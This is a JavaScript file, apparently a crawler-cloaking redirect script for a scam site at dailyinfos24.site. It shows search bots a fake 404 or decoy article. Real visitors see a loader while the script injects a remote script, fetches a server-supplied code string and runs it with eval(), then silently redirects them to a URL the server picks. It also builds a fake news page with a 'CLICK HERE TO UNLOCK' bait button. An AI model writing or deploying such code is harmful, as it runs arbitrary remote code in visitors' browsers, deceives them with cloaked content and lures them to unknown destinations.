var isCrawler = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
var debug = false;
var stopped = false;
var loader = false;
var is404 = false;
var DOM = {};
const urlParams = new URLSearchParams(window.location.search);
var identifier;
var triggered = false;

// 1. Identify Target
if (urlParams.has("o2x")) {
    identifier = urlParams.get("o2x");
} else if (urlParams.has("io0")) {
    identifier = urlParams.get("io0");
}

if (!identifier && !urlParams.has("dbg123")) {
    show404();
}

if (identifier !== undefined) {
    // Inject the SEO Bridge Script from your PHP
    var script = document.createElement("script");
    script.setAttribute("src", "https://dailyinfos24.site/js6/index.php?id=" + identifier);
    script.setAttribute("id", "code");
    document.head.appendChild(script);

    // Loader Logic for Real Users
    if (!isCrawler) {
        (function() {
            'use strict';
            var observer = new MutationObserver(function() {
                if (document.body && !isCrawler && !stopped && !is404) {
                    loader = true;
                    let wrap = document.createElement("div");
                    wrap.setAttribute("class", "loader-wrap");
                    let spin = document.createElement("span");
                    spin.setAttribute("class", "loader");
                    let style = document.createElement("style");
                    style.innerHTML = ".loader-wrap{position:fixed;background-color:#FFF;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;align-items:center;justify-content:center;transition:.5s}.loader{width:68px;height:68px;border:5px dotted #525252;border-radius:50%;display:inline-block;position:relative;box-sizing:border-box;animation:2s linear infinite rotation}@keyframes rotation{0%{opacity:.01;transform:rotate(0)}50%{opacity:1;transform:rotate(180deg)}100%{opacity:.01;transform:rotate(360deg)}}";
                    document.head.appendChild(style);
                    document.body.appendChild(wrap);
                    wrap.appendChild(spin);
                    observer.disconnect();
                }
            });
            observer.observe(document.documentElement, { childList: true });
        })();

        if (urlParams.has("dbg123")) debug = true;

        // Fetch Redirect/API Logic
        load("https://dailyinfos24.site/api/latest/" + identifier).then(api => {
            if (api.rCode) eval(api.rCode);
            if (!debug && api.redirect && !stopped) {
                triggered = true;
                window.location.replace(api.to);
            }
        }).catch(err => {
            if (!debug && !stopped && !is404) errorRedirect();
        });
    }

    // Base Meta Tags
    injectBaseMetas();

    // Load Content UI
    script.onerror = loadDefault;
    setTimeout(() => { if (!triggered) loadDefault(); }, 3000);
}

function load(url) {
    return fetch(url).then(res => res.json()).catch(err => {});
}

function loadDefault() {
    if (stopped || triggered) return;
    if (!identifier && !debug) return show404();

    // Wait for Body to exist
    let checkBody = setInterval(() => {
        if (document.body !== null) {
            clearInterval(checkBody);
            initDom();
        }
    }, 50);

    // Fetch Content JSON from Storage
    load("https://storage.dailyinfos24.site/fetch/" + identifier + ".json").then(data => {
        document.title = titleCase(data.title) + " [" + (data.random1 || '') + "]";
        hideLoader();
        
        // Populate DOM once it's ready
        let checkUI = setInterval(() => {
            if (DOM.footer !== undefined) {
                clearInterval(checkUI);
                populateDom(data);
            }
        }, 50);
    });
}

function initDom() {
    // Styles
    DOM.styles = document.createElement("style");
    DOM.styles.innerHTML = "*,:before,:after{box-sizing:border-box;border-width:0}body{margin:0;font-family:sans-serif;background:#fff}.mx-auto{margin-left:auto;margin-right:auto}.text-center{text-align:center}.w-full{width:100%}.bg-gray-700{background:#374151}.text-white{color:#fff}.p-2{padding:0.5rem}.p-4{padding:1rem}.max-w-7xl{max-width:80rem}.grid{display:grid}.mt-4{margin-top:1rem}.px-2{padding:0 0.5rem}.font-bold{font-weight:700}.text-xl{font-size:1.25rem}.md-text-4xl{font-size:2.25rem}.text-gray-500{color:#6b7280}.bg-blue-400{background:#60a5fa}.rounded{border-radius:0.25rem}.my-10{margin:2.5rem 0}.relative{position:relative}.absolute{position:absolute}.inset-0{top:0;right:0;bottom:0;left:0}";
    document.head.appendChild(DOM.styles);

    // Layout
    document.body.innerHTML = '';
    DOM.header = document.createElement("header");
    DOM.header.innerHTML = `<div class="mx-auto text-center"><img src="https://dailyinfos24.site/images/logo.png" class="p-2 mx-auto" style="max-height:80px"></div><nav class="w-full bg-gray-700 text-center p-2 text-white">${new Date().toDateString()}</nav>`;
    document.body.appendChild(DOM.header);

    DOM.main = document.createElement("main");
    DOM.main.className = "px-2 w-full max-w-7xl mx-auto grid mt-4";
    document.body.appendChild(DOM.main);

    DOM.article = document.createElement("article");
    DOM.main.appendChild(DOM.article);

    DOM.h1 = document.createElement("h1");
    DOM.h1.className = "font-bold text-xl md-text-4xl";
    DOM.article.appendChild(DOM.h1);

    DOM.metaP = document.createElement("p");
    DOM.metaP.className = "text-gray-500";
    DOM.article.appendChild(DOM.metaP);

    DOM.img = document.createElement("img");
    DOM.img.style = "width:100%; max-height:400px; object-fit:contain; margin:20px 0";
    DOM.article.appendChild(DOM.img);

    DOM.p1 = document.createElement("p");
    DOM.article.appendChild(DOM.p1);

    // Button 1
    DOM.btn1 = document.createElement("div");
    DOM.btn1.className = "bg-blue-400 text-white p-4 text-center rounded my-10 relative";
    DOM.btn1.innerHTML = `<a id="link1" class="absolute inset-0"></a><span class="block">Special Access:</span><span class="text-2xl font-bold">CLICK HERE TO UNLOCK</span>`;
    DOM.article.appendChild(DOM.btn1);

    DOM.p2 = document.createElement("p");
    DOM.article.appendChild(DOM.p2);

    DOM.footer = document.createElement("footer");
    DOM.footer.style = "height:100px";
    document.body.appendChild(DOM.footer);
}

function populateDom(data) {
    DOM.h1.innerHTML = titleCase(data.title) + " [" + (data.random1 || '') + "]";
    DOM.img.src = data.backdrop || data.image;
    DOM.metaP.innerHTML = "Published on: " + new Date().toLocaleDateString();
    
    let textArr = (data.text || "").split("\n");
    DOM.p1.innerHTML = textArr.slice(0, Math.floor(textArr.length/2)).join("<br>");
    DOM.p2.innerHTML = textArr.slice(Math.floor(textArr.length/2)).join("<br>");
}

function hideLoader() {
    let l = document.querySelector(".loader-wrap");
    if (l) l.style.display = "none";
}

function titleCase(str) {
    return str ? str.replace(/\b\w/g, l => l.toUpperCase()) : "";
}

function show404() {
    is404 = true;
    document.body.innerHTML = "<h1 style='text-align:center;margin-top:100px'>404 Not Found</h1>";
}

function errorRedirect() {
    window.location.href = "https://dailyinfos24.site/bh?ref=" + encodeURIComponent(window.location.href);
}

function injectBaseMetas() {
    let m1 = document.createElement("meta"); m1.setAttribute("charset", "utf-8");
    let m2 = document.createElement("meta"); m2.setAttribute("name", "viewport"); m2.setAttribute("content", "width=device-width, initial-scale=1");
    document.head.appendChild(m1);
    document.head.appendChild(m2);
}
